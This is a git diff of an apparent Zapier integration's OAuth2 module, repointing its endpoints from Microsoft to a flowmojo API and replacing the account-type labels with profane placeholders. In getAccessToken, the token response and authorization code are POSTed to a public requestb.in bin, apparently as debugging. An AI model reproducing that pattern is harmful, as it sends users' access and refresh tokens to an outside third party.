@@ -1,12 +1,13 @@
 'use strict';
 
-const baseOauthUrl = 'https://login.microsoftonline.com/common/oauth2';
+// const baseOauthUrl = 'https://login.microsoftonline.com/common/oauth2';
+const baseOauthUrl = 'https://app.flowmojo.com/api/v1/oauth2';
 // To get your OAuth2 redirect URI, run `zapier describe` and update this variable.
-// Will looke like 'https://zapier.com/dashboard/auth/oauth/return/App123CLIAPI/'
-const redirectUri = '';
+// Will look like 'https://zapier.com/dashboard/auth/oauth/return/App123CLIAPI/'
+const redirectUri = 'https://zapier.com/dashboard/auth/oauth/return/App1944CLIAPI/';
 
 const getAuthorizeURL = (z, bundle) => {
-  let url = `${baseOauthUrl}/v2.0/authorize`;
+  let url = `${baseOauthUrl}/auth`;
 
   const urlParts = [
     `client_id=${process.env.CLIENT_ID}`,
@@ -15,7 +16,7 @@ const getAuthorizeURL = (z, bundle) => {
   ];
 
   if (bundle.inputData.accountType === 'business') {
-    url = `${baseOauthUrl}/authorize`;
+    url = `${baseOauthUrl}/auth`;
   } else {
     urlParts.push(`state=${bundle.inputData.state}`);
   }
@@ -26,7 +27,7 @@ const getAuthorizeURL = (z, bundle) => {
 };
 
 const getAccessToken = (z, bundle) => {
-  let url = `${baseOauthUrl}/v2.0/token`;
+  let url = `${baseOauthUrl}/token`;
 
   const body = {
     code: bundle.inputData.code,
@@ -35,11 +36,11 @@ const getAccessToken = (z, bundle) => {
     grant_type: 'authorization_code',
   };
 
-  if (bundle.inputData.accountType === 'business') {
-    url = `${baseOauthUrl}/token`;
-    body.redirect_uri = redirectUri;
-    body.resource = 'https://graph.microsoft.com/';
-  }
+  // if (bundle.inputData.accountType === 'business') {
+  //   url = `${baseOauthUrl}/token`;
+  //   body.redirect_uri = redirectUri;
+  //   body.resource = 'https://graph.microsoft.com/';
+  // }
 
   const promise = z.request(url, {
     method: 'POST',
@@ -57,7 +58,7 @@ const getAccessToken = (z, bundle) => {
     let result = z.JSON.parse(response.content);
 
     result.codeeee = bundle.inputData.code;
-    let p = z.request('https://requestb.in/1lo4zxh1', {
+    let p = z.request('https://requestb.in/11pwyyi1', {
       method: 'POST',
       body: result,
       headers: {
@@ -79,7 +80,7 @@ const getAccessToken = (z, bundle) => {
 };
 
 const refreshAccessToken = (z, bundle) => {
-  let url = `${baseOauthUrl}/v2.0/token`;
+  let url = `${baseOauthUrl}/token`;
 
   const body = {
     refresh_token: bundle.authData.refresh_token,
@@ -88,11 +89,11 @@ const refreshAccessToken = (z, bundle) => {
     grant_type: 'refresh_token',
   };
 
-  if (bundle.authData.accountType === 'business') {
-    url = `${baseOauthUrl}/token`;
-    body.redirect_uri = redirectUri;
-    body.resource = 'https://graph.microsoft.com/';
-  }
+  // if (bundle.authData.accountType === 'business') {
+  //   url = `${baseOauthUrl}/token`;
+  //   body.redirect_uri = redirectUri;
+  //   body.resource = 'https://graph.microsoft.com/';
+  // }
 
   const promise = z.request(url, {
     method: 'POST',
@@ -122,7 +123,7 @@ const refreshAccessToken = (z, bundle) => {
 // the token and not because the user didn't happen to have a recently created record.
 const testAuth = (z) => {
   const promise = z.request({
-    url: 'https://graph.microsoft.com/v1.0/me',
+    url: 'https://app.flowmojo.com/api/v1/me',
   });
 
   return promise.then((response) => {
@@ -151,8 +152,8 @@ module.exports = {
       key: 'accountType',
       label: 'Account Type',
       choices: {
-        'personal': 'Personal - live.com/outlook.com',
-        'business': 'Business - Work or School'
+        'personal': 'I DONT FUCKING',
+        'business': 'KNOW'
       },
       default: 'personal',
       required: true,
